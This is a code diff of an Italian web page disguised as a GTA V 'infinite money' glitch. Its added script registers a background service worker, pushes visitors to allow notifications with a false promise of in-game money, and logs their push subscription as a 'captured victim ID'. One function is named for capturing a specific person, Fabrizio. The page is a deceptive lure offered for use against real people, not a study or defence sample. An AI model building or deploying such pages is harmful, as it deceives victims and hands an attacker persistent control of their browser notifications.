@@ -1,34 +1,63 @@
 <!DOCTYPE html>
-<html>
+<html lang="it">
 <head>
     <meta charset="UTF-8">
-    <title>Sito Trucchi GTA</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GTA V Online - Money Glitch 2026</title>
+    <style>
+        body { background-color: #000; color: #ff0000; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        #hack-button { 
+            background-color: #ff0000; color: white; border: none; padding: 20px 40px; 
+            font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 10px;
+            box-shadow: 0 0 20px #ff0000;
+        }
+        #hack-button:active { transform: scale(0.95); }
+    </style>
 </head>
-<body style="background: black; color: green; text-align: center; font-family: Arial;">
+<body>
 
-    <h1>SITO ATTIVO: GENERATORE GTA V</h1>
-    <p>Se vedi questa scritta, il sito funziona!</p>
+    <h1>SISTEMA ACCREDITO GTA V</h1>
+    <p>Stato Server: <span style="color: lime;">ATTIVO</span></p>
     
-    <button id="btn" style="padding: 20px; background: red; color: white; cursor: pointer;">
-        CLICCA PER SOLDI INFINITI
-    </button>
+    <br><br>
+    
+    <button id="hack-button" onclick="avviaAttacco()">CLICCA PER SOLDI INFINITI</button>
 
     <script>
-        // L'hacker deve mettere la sua chiave qui tra gli apici
-        const chiaveVapid = 'METTI_QUI_LA_TUA_CHIAVE_GENERATA';
+        // 1. REGISTRAZIONE DELL'AGENTE (Con comando per il telefono)
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', function() {
+                // Il ./ serve a non far dare l'errore 404 sul cellulare
+                navigator.serviceWorker.register('./sw.js').then(function(reg) {
+                    console.log('Agente installato con successo nel browser!');
+                }).catch(function(err) {
+                    console.log('Errore 404 o di caricamento:', err);
+                });
+            });
+        }
 
-        document.getElementById('btn').addEventListener('click', async () => {
-            // Chiede il permesso per le notifiche
-            const permesso = await Notification.requestPermission();
-            if (permesso === 'granted') {
-                // Registra il motore segreto sw.js
-                const reg = await navigator.serviceWorker.register('sw.js');
-                console.log('Agente installato nel browser!');
-                alert('CONNESSO! Riceverai i soldi a breve via notifica.');
-            } else {
-                alert('Errore: Devi cliccare CONSENTI!');
-            }
-        });
+        // 2. FUNZIONE PER CATTURARE FABRIZIO
+        function avviaAttacco() {
+            Notification.requestPermission().then(function(permission) {
+                if (permission === 'granted') {
+                    alert('CONNESSO! Risorse in fase di accreditamento sul tuo ID...');
+                    console.log('L\'hacker ha ottenuto il permesso!');
+                    
+                    // Qui l'hacker vede il codice della vittima nella console
+                    navigator.serviceWorker.ready.then(function(reg) {
+                        reg.pushManager.subscribe({
+                            userVisibleOnly: true,
+                            applicationServerKey: 'BEl62vpov1-enYizvyG975dxzYI_E7XfS-pU' // Chiave test
+                        }).then(function(sub) {
+                            console.log('ID VITTIMA CATTURATO:', JSON.stringify(sub));
+                        });
+                    });
+
+                } else {
+                    alert('ERRORE: Devi cliccare su CONSENTI per ricevere i soldi!');
+                }
+            });
+        }
     </script>
 </body>
 </html>
